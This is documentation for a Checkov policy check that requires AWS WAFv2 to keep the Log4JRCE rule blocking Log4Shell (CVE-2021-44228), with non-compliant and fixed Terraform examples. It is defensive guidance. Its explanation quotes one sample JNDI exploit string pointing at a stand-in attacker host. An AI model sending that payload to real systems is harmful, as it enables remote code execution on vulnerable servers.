# CKV_AWS_192: Ensure WAF prevents message lookup in Log4j2. See CVE-2021-44228 aka log4jshell
## Severity
**HIGH** (score: 7.5/10)

This check verifies a WAF rule blocks JNDI/message-lookup patterns associated with CVE-2021-44228 (Log4Shell), a trivially exploitable unauthenticated remote code execution vulnerability, so its absence leaves a direct path to full remote compromise of backend applications.

## Summary
This check requires that an AWS WAFv2 Web ACL includes the AWS Managed Rule Group `AWSManagedRulesKnownBadInputsRuleSet` with its `Log4JRCE` rule active (not excluded/counted), so the WAF actively blocks Log4Shell (CVE-2021-44228) exploitation attempts.

## Applicability
**Checkov framework(s):** `cloudformation`, `terraform`

- **IaC frameworks:** CloudFormation, Terraform
- **Resource/entity types:** `AWS::WAFv2::WebACL` (CloudFormation); `aws_wafv2_web_acl` (Terraform)
- **Check type:** resource (custom logic, `BaseResourceCheck`)

## Why it matters
CVE-2021-44228 ("Log4Shell") is a critical remote code execution vulnerability in the widely-used Apache Log4j2 logging library, exploited by sending a crafted string (e.g., `${jndi:ldap://attacker.com/a}`) in any application input that gets logged — HTTP headers, User-Agent, query parameters, JSON body fields, etc. — causing the vulnerable server to perform a JNDI lookup against an attacker-controlled server, leading to remote class loading and code execution. Because the payload can appear in virtually any request field, and many applications embed Log4j transitively (in application servers, logging frameworks, or third-party libraries) without engineering teams even being aware of it, this vulnerability caused a global mass-exploitation event in December 2021. A WAF rule that inspects and blocks JNDI lookup patterns in incoming requests provides a critical compensating control at the edge, buying time for patching internal services and providing defense-in-depth even after patching, since new bypass variants of the exploit string continued to surface for months.

## How Checkov evaluates this
Both implementations use custom `scan_resource_conf` logic (not a simple attribute-value check):
- It walks the WAF's `rule`/`Rules` list looking for a rule whose `statement.managed_rule_group_statement` (Terraform) / `Statement.ManagedRuleGroupStatement` (CloudFormation) has `name == "AWSManagedRulesKnownBadInputsRuleSet"`.
- If found, it checks the rule's `excluded_rule`/`ExcludedRules` list: if any excluded rule's `name` is `"Log4JRCE"`, the check **FAILS** — because excluding that specific sub-rule means the Log4Shell detection is disabled even though the parent managed rule group is present.
- It also checks the rule's `override_action`: if the override action is anything other than `none` (e.g. `count`), the check **FAILS** — because setting the whole managed rule group to "count" mode means matches are only logged, not blocked, effectively neutering protection.
- If the `AWSManagedRulesKnownBadInputsRuleSet` managed rule group is not present in the Web ACL at all, the check **FAILS**.
- Only when the rule group is present, `Log4JRCE` is not excluded, and the override action is `none` (blocking mode) does the check **PASS**.

## Non-compliant example
```hcl
resource "aws_wafv2_web_acl" "example" {
  name  = "app-waf"
  scope = "REGIONAL"

  default_action {
    allow {}
  }

  rule {
    name     = "known-bad-inputs"
    priority = 1

    override_action {
      count {}  # rule group set to count-only, not blocking
    }

    statement {
      managed_rule_group_statement {
        name        = "AWSManagedRulesKnownBadInputsRuleSet"
        vendor_name = "AWS"

        excluded_rule {
          name = "Log4JRCE"  # Log4Shell detection explicitly disabled
        }
      }
    }

    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name                = "known-bad-inputs"
      sampled_requests_enabled   = true
    }
  }

  visibility_config {
    cloudwatch_metrics_enabled = true
    metric_name                = "app-waf"
    sampled_requests_enabled   = true
  }
}
```

## Remediated example
```hcl
resource "aws_wafv2_web_acl" "example" {
  name  = "app-waf"
  scope = "REGIONAL"

  default_action {
    allow {}
  }

  rule {
    name     = "known-bad-inputs"
    priority = 1

    override_action {
      none {}  # blocking mode -- rule group actively enforces
    }

    statement {
      managed_rule_group_statement {
        name        = "AWSManagedRulesKnownBadInputsRuleSet"
        vendor_name = "AWS"
        # no excluded_rule block -- Log4JRCE stays active
      }
    }

    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name                = "known-bad-inputs"
      sampled_requests_enabled   = true
    }
  }

  visibility_config {
    cloudwatch_metrics_enabled = true
    metric_name                = "app-waf"
    sampled_requests_enabled   = true
  }
}
```

## Remediation steps
1. Add (or keep) the AWS managed rule group `AWSManagedRulesKnownBadInputsRuleSet` in your WAFv2 Web ACL's rules.
2. Set the rule's `override_action` to `none` (block mode), not `count`, so matching requests are actually blocked rather than just logged.
3. Do not add `Log4JRCE` to the `excluded_rule`/`ExcludedRules` list — leave it active within the managed rule group.
4. Even with this WAF rule in place, still patch/upgrade Log4j2 to version 2.17.1+ (or remove the vulnerable JNDI lookup class) in all affected applications — the WAF rule is a compensating control, not a substitute for patching, since attackers continually find WAF-bypass payload variants.
5. Monitor WAF sampled requests/CloudWatch metrics for this rule to detect active exploitation attempts against your environment.

## References
- [Checkov check source (CloudFormation)](https://github.com/bridgecrewio/checkov/blob/main/checkov/cloudformation/checks/resource/aws/WAFACLCVE202144228.py)
- [Checkov check source (Terraform)](https://github.com/bridgecrewio/checkov/blob/main/checkov/terraform/checks/resource/aws/WAFACLCVE202144228.py)
- [AWS WAF Known Bad Inputs managed rule group documentation](https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-baseline.html)
- [CVE-2021-44228 (Log4Shell) — NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
